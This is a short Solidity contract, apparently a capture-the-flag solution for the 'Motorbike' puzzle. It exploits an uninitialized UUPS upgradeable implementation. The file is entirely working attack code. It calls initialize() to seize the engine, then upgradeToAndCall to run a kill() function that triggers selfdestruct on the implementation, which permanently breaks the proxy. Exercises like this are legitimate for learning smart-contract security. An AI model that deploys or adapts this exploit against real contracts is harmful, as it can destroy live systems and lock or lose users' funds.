// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

interface IEngine {
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
}

contract MotorbikeAttack {
    address public engine;
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    
    struct AddressSlot {
        address value;
    }

    function attack(address _engine) public {
        engine = _engine;
        IEngine(engine).initialize();
        IEngine(engine).upgradeToAndCall(address(this), abi.encodeWithSignature("kill()"));

    }

    function kill() public {
        selfdestruct(msg.sender);
    }
}